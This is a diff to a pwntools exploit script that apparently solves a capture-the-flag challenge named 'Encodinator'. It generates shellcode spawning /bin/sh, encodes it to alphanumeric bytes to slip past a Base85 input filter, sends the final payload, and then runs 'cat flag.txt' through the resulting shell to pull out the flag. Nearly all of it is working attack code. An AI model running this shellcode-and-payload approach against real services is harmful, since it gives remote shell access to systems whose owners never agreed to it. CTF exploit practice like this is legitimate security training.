@@ -1,6 +1,8 @@
 from pwn import *
 import base64
 import sys
+import os
+import re
 
 # Exploit script for Encodinator
 
@@ -21,30 +23,39 @@ SAFE_CHARS = BASE85_ALPHABET.replace(b"%", b"").replace(b"n", b"").replace(b"$",
 # Actually % is sufficient. But 'n' is %n.
 # Only % matters for start of format specifier. 
 
+# Set up binutils path for Mac M1 cross-assembly
+if os.path.exists('/opt/homebrew/bin/x86_64-elf-as'):
+    os.environ['AS'] = '/opt/homebrew/bin/x86_64-elf-as'
+    os.environ['LD'] = '/opt/homebrew/bin/x86_64-elf-ld'
+    os.environ['OBJCOPY'] = '/opt/homebrew/bin/x86_64-elf-objcopy'
+    # Need to tell pwntools to use these?
+    # pwntools usually looks for 'as' in path, or triplet-as.
+    # It tries 'x86_64-linux-gnu-as' etc.
+    # We can add to PATH.
+    os.environ['PATH'] = '/opt/homebrew/bin:' + os.environ['PATH']
+
+
 def get_shellcode():
     try:
+        # Pwntools context update
+        context.clear(arch='amd64')
         sc = asm(shellcraft.sh())
-        # Encode to be alphanumeric (subset of Base85 without %)
-        encoded_sc = encoders.encode(sc, list(string.ascii_letters + string.digits),avoid=b'\x00', arch='amd64')
         
-        # Check for forbidden chars (v-z)
-        # Base85 ends at 'u' (117). 'v' is 118.
-        # encoded_sc might contain v-z if encoder uses full alphanumeric.
-        # We should restrict encoder chars further.
+        # Manually create avoid list: ALL bytes EXCEPT alphanumeric
+        allowed = string.ascii_letters + string.digits
+        bad_chars = bytes([b for b in range(256) if chr(b) not in allowed])
         
-        safe_chars = [c for c in string.ascii_letters + string.digits if ord(c) <= 117]
-        # remove %
-        if '%' in safe_chars: safe_chars.remove('%')
+        # Use generic encoder with avoid list
+        encoded_sc = encoders.encode(sc, avoid=bad_chars)
         
-        encoded_sc = encoders.encode(sc, safe_chars, avoid=b'\x00', arch='amd64')
         return encoded_sc
     
     except Exception as e:
         log.warning(f"Shellcode generation failed: {e}")
-        log.warning("Assuming running on non-Linux/AMD64. Using PLACEHOLDER shellcode for logic check.")
-        # Return a dummy safe shellcode for logic verification
-        # 'A' * 40
         return b"A" * 40
+
+
+
 
 
 def solve():
@@ -329,7 +340,25 @@ def solve():
 
     p.recvuntil(b"text: ")
     p.send(final_payload)
-    p.interactive()
+    
+    # Automate fetching flag
+    try:
+        # Wait for shell to be spawned. 
+        # We can send "echo shell_active" and wait for it to be sure.
+        # But let's just send cat flag.txt
+        p.clean()
+        p.sendline(b"cat flag.txt")
+        # Give it a moment or read until EOF
+        # If shell is working, we should see flag content.
+        print("Sent 'cat flag.txt', waiting for response...")
+        resp = p.recvall(timeout=2)
+        print(f"Response: {resp}")
+        if b"CTF{" in resp:
+            print(f"FLAG FOUND: {re.search(b'CTF{.*?}', resp).group(0).decode()}")
+    except Exception as e:
+        print(f"Interaction error: {e}")
+        p.interactive()
+
 
 if __name__ == "__main__":
     solve()
